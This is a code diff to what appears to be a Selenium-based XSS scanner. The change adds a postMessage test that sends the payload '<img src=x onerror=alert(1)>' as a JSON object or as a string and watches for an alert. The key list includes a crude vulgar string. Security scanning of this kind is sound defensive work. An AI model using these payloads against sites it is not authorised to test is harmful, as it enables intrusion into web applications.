@@ -952,24 +952,44 @@ def windowAddEventListenerMessage(driver, abs_path, url_path, payloads):
     for button in buttons:
         button.click()
 
+
+
+    # implement tommorow 
+
     regex_results = ['data', 'log', 'cocksuker123', '123skd', 'message']
+    # regex_results = []
+
     xss_payload = '<img src=x onerror=alert(1)>'
 
-
     driver.switch_to.window(example)
-    object_payload = {key: xss_payload for key in regex_results}
 
-    driver.execute_script(f"window.postMessage({object_payload},'*')")
-    
-    try:
-        # wait 2 seconds to see if alert is detected
-        WebDriverWait(driver, 2).until(EC.alert_is_present())
-        alert = driver.switch_to.alert
-        alert.accept()
-        print('+ Alert Detected +')
-    except TimeoutException:
-        print('= No alerts detected =')
+    # check if regex scan found anything
+    # if regex able to find scan results, send payload as json object
+    if len(regex_results) > 0:
+        object_payload = {key: xss_payload for key in regex_results}
+        driver.execute_script(f"window.postMessage({object_payload},'*')")
 
+        try:
+            # wait 2 seconds to see if alert is detected
+            WebDriverWait(driver, 2).until(EC.alert_is_present())
+            alert = driver.switch_to.alert
+            alert.accept()
+            print('+ Alert Detected +')
+        except TimeoutException:
+            print('= No alerts detected =')
+
+    # else, send payload as string
+    else:
+        driver.execute_script(f"window.postMessage(`{xss_payload}`,'*')")
+
+        try:
+            # wait 2 seconds to see if alert is detected
+            WebDriverWait(driver, 2).until(EC.alert_is_present())
+            alert = driver.switch_to.alert
+            alert.accept()
+            print('+ Alert Detected +')
+        except TimeoutException:
+            print('= No alerts detected =')
 
 
 
